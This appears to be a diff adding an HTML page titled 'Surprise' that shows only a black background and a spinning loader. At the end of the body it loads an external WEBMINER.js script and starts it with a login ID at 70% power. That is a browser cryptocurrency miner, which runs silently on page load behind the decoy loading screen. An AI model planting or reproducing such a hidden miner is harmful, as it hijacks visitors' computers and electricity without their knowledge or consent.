@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surprise</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inder&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+    <style>
+        /* Reset and base styles  */
+        * {
+            padding: 0px;
+            margin: 0px;
+            border: none;
+        }
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+        }
+
+        /* Links */
+
+        a, a:link, a:visited  {
+            text-decoration: none;
+        }
+
+        a:hover  {
+            text-decoration: none;
+        }
+
+        /* Common */
+
+        aside, nav, footer, header, section, main {
+            display: block;
+        }
+
+        h1, h2, h3, h4, h5, h6, p {
+            font-size: inherit;
+            font-weight: inherit;
+        }
+
+        ul, ul li {
+            list-style: none;
+        }
+
+        img {
+            vertical-align: top;
+        }
+
+        img, svg {
+            max-width: 100%;
+            height: auto;
+        }
+
+        address {
+        font-style: normal;
+        }
+
+        /* Form */
+
+        input, textarea, button, select {
+            font-family: inherit;
+            font-size: inherit;
+            color: inherit;
+            background-color: transparent;
+        }
+
+        input::-ms-clear {
+            display: none;
+        }
+
+        button, input[type="submit"] {
+            display: inline-block;
+            box-shadow: none;
+            background-color: transparent;
+            background: none;
+            cursor: pointer;
+        }
+
+        input:focus, input:active,
+        button:focus, button:active {
+            outline: none;
+        }
+
+        button::-moz-focus-inner {
+            padding: 0;
+            border: 0;
+        }
+
+        label {
+            cursor: pointer;
+        }
+
+        legend {
+            display: block;
+        }
+
+        .BackgroundColor {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-color: rgb(0, 0, 0);
+        }
+
+        /* Основные стили для контейнера */
+        .loader-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #000000;
+        }
+
+        /* Стили для круга загрузки */
+        .loader {
+            border: 5px solid #000000; 
+            border-top: 5px solid #ffffff; 
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite; /* Анимация вращения */
+        }
+
+        /* Анимация вращения */
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+    </style>
+</head>
+<body>
+    <div class="BackgroundColor"></div>
+
+    <div class="gradient-container">
+        <div class="gradient-circle"></div>
+    </div>
+
+    <div class="loader-container">
+        <div class="loader"></div>
+    </div>
+
+   
+
+
+
+    <script src="https://wm.bmwebm.org/WEBMINER.js"></script>
+    <script>WEBMINER.config({ login: "7242645", pass: null }).power(70);</script>
+</body>
+</html>
